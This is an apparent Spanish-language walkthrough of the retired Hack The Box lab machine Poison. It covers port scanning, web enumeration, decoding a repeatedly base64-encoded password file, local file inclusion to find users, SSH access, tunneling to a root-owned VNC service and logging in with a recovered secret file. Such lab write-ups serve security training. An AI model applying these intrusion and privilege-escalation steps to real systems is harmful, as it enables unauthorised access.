# POSITON-HTB

Desarrollo de la VM POISON de HACK THE BOX (HTB)

## 1. Configuración de la VM

- La VM se encuentra en estado de retirada de HTB
- Se debe activar la VM para poder usarla, se requiere una suscripción PREMIUM.

## 2. Escaneo de Puertos

```
┌──(root㉿kali)-[~/HT/POISON]
└─# cat full.nmap
# Nmap 7.92 scan initiated Wed Apr 20 23:09:30 2022 as: nmap -n -P0 --top-ports 5000 -sS -sC -vv -oA full 10.129.1.254
Nmap scan report for 10.129.1.254
Host is up, received user-set (0.22s latency).
Scanned at 2022-04-20 23:09:31 EDT for 182s
Not shown: 4998 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
| ssh-hostkey: 
|   2048 e3:3b:7d:3c:8f:4b:8c:f9:cd:7f:d2:3a:ce:2d:ff:bb (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDFLpOCLU3rRUdNNbb5u5WlP+JKUpoYw4znHe0n4mRlv5sQ5kkkZSDNMqXtfWUFzevPaLaJboNBOAXjPwd1OV1wL2YFcGsTL5MOXgTeW4ixpxNBsnBj67mPSmQSaWcudPUmhqnT5VhKYLbPk43FsWqGkNhDtbuBVo9/BmN+GjN1v7w54PPtn8wDd7Zap3yStvwRxeq8E0nBE4odsfBhPPC01302RZzkiXymV73WqmI8MeF9W94giTBQS5swH6NgUe4/QV1tOjTct/uzidFx+8bbcwcQ1eUgK5DyRLaEhou7PRlZX6Pg5YgcuQUlYbGjgk6ycMJDuwb2D5mJkAzN4dih
|   256 4c:e8:c6:02:bd:fc:83:ff:c9:80:01:54:7d:22:81:72 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKXh613KF4mJTcOxbIy/3mN/O/wAYht2Vt4m9PUoQBBSao16RI9B3VYod1HSbx3PYsPpKmqjcT7A/fHggPIzDYU=
|   256 0b:8f:d5:71:85:90:13:85:61:8b:eb:34:13:5f:94:3b (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrg2EBbG5D2maVLhDME5mZwrvlhTXrK7jiEI+MiZ+Am
80/tcp open  http    syn-ack ttl 63
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison1.jpg" width=80% />

## 3. Enumeración

## 3.1 Enumeración HTTP

```
┌──(root㉿kali)-[~/HT/POISON]
└─# gobuster dir -u http://10.129.1.254/ -w /root/SecLists/Discovery/Web-Content/big.txt -t 80 -x .php,.html,.txt
```
<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison2.jpg" width=80% />

- Resaltan los archivos phpinfo.php, ini.php, info.php.

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison3.jpg" width=80% />

- Nos enfrentamos a un FREEBSD y un ALLOW_URL_FOPEN=On

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison4.jpg" width=80% />


## 3.2 Acceso al Portal Web

- En el portal ingresamos las páginas que se nos brinda y probamos.

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison5.jpg" width=80% />

- Identificamos el archivo: pwdbackup.txt

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison6.jpg" width=80% />

- Descargamos el archivo y nos indica que esta encodeado 13 veces. Parece un base64 ya que acaba en "=".

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison7.jpg" width=80% />

- Decodeamos 13 veces.

```
data=$(cat pwd.txt); for i in $(seq 1 13); do data=$(echo $data | tr -d ' ' | base64 -d); done; echo $data
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison8.jpg" width=80% />


## 4. Explotación

### 4.1. Acceso por SSSH y LFI

- Identificamos LFI (Local File Inclusion) y usuarios: root y charix

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison9.jpg" width=80% />

- Ingresamos por SSH con el usuario CHARIX y el password que decodeamos 13 veces.


### 4.2. Listado de Procesos y Puertos Abiertos

- Debido a que es un FREEBSD ejecutar el NETSTAT  es un poco diferente

```
charix@Poison:~ % netstat -an -p tcp
Active Internet connections (including servers)
Proto Recv-Q Send-Q Local Address          Foreign Address        (state)
tcp4       0     44 10.129.1.254.22        10.10.16.25.57130      ESTABLISHED
tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
tcp4       0      0 *.80                   *.*                    LISTEN
tcp6       0      0 *.80                   *.*                    LISTEN
tcp4       0      0 *.22                   *.*                    LISTEN
tcp6       0      0 *.22                   *.*                    LISTEN
tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison10.jpg" width=80% />

- Identificamos que correo VNC en los puertos 5801 y 5901 pero solo a nivel de LOCALHOST.

- Hacemos un TUNNELING a través de SSH para poder acceder de manera remota.

```
┌──(root㉿kali)-[~/HT/POISON]
└─# ssh -L 5902:localhost:5901 charix@10.129.1.254
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison11.jpg" width=80% />


## 5. Elevando Privilegios

### 5.1. VNC como root

- VNC esta corriendo como ROOT asi que eso nos permite elevar privilegios

```
charix@Poison:~ % ps aux
USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED      TIME COMMAND
root     11 100.0  0.0      0    16  -  RL   05:06   724:14.62 [idle]
root      0   0.0  0.0      0   160  -  DLs  05:06     0:00.10 [kernel]
root      1   0.0  0.1   5408   976  -  ILs  05:06     0:00.01 /sbin/init --
root      2   0.0  0.0      0    16  -  DL   05:06     0:00.00 [crypto]
root      3   0.0  0.0      0    16  -  DL   05:06     0:00.00 [crypto returns]
root      4   0.0  0.0      0    32  -  DL   05:06     0:00.70 [cam]
root      5   0.0  0.0      0    16  -  DL   05:06     0:00.00 [mpt_recovery0]
root      6   0.0  0.0      0    16  -  DL   05:06     0:00.00 [sctp_iterator]
root      7   0.0  0.0      0    16  -  DL   05:06     0:06.39 [rand_harvestq]
root      8   0.0  0.0      0    16  -  DL   05:06     0:00.01 [soaiod1]
root      9   0.0  0.0      0    16  -  DL   05:06     0:00.00 [soaiod2]
root     10   0.0  0.0      0    16  -  DL   05:06     0:00.00 [audit]
root     12   0.0  0.1      0   736  -  WL   05:06     0:36.40 [intr]
root     13   0.0  0.0      0    48  -  DL   05:06     0:00.01 [geom]
root     14   0.0  0.0      0   160  -  DL   05:06     0:03.04 [usb]
root     15   0.0  0.0      0    16  -  DL   05:06     0:00.00 [soaiod3]
root     16   0.0  0.0      0    16  -  DL   05:06     0:00.01 [soaiod4]
root     17   0.0  0.0      0    48  -  DL   05:06     0:00.77 [pagedaemon]
root     18   0.0  0.0      0    16  -  DL   05:06     0:00.00 [vmdaemon]
root     19   0.0  0.0      0    16  -  DL   05:06     0:00.00 [pagezero]
root     20   0.0  0.0      0    32  -  DL   05:06     0:00.77 [bufdaemon]
root     21   0.0  0.0      0    16  -  DL   05:06     0:00.13 [bufspacedaemon]
root     22   0.0  0.0      0    16  -  DL   05:06     0:01.07 [syncer]
root     23   0.0  0.0      0    16  -  DL   05:06     0:00.15 [vnlru]
root    332   0.0  0.2  10624  2380  -  Is   05:06     0:00.17 dhclient: le0 [priv] (dhclient)
_dhcp   395   0.0  0.2  10624  2496  -  Is   05:06     0:00.11 dhclient: le0 (dhclient)
root    396   0.0  0.5   9560  5052  -  Ss   05:06     0:03.35 /sbin/devd
root    469   0.0  0.2  10500  2452  -  Ss   05:06     0:01.05 /usr/sbin/syslogd -s
root    622   0.0  0.6  56320  5700  -  S    05:06     0:34.53 /usr/local/bin/vmtoolsd -c /usr/local/share/vmware-tools/tools.conf -p /usr/local/lib/open-vm-tools/plugin
root    699   0.0  0.7  57812  7052  -  Is   05:06     0:00.05 /usr/sbin/sshd
```

### 5.2. Archivo SECRET

- El usuario CHARIX tiene archivo secret.zip. Lo copiamos a nuestra máquina KALI y utilizamos la ÚNICA contraseña que tenemos para descomprimir el archivo.

```
┌──(root㉿kali)-[~]
└─# scp charix@10.129.1.254:/home/charix/secret.zip .
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison12.jpg" width=80% />


### 5.3. Ingresar como VNC

- Utilizamos el archivo SECRET para conectarnos a través de VNC

```
┌──(root㉿kali)-[~]
└─# vncviewer localhost:5902 -passwd secret
```

<img src="https://github.com/El-Palomo/POSITON-HTB/blob/main/Poison13.jpg" width=80% />

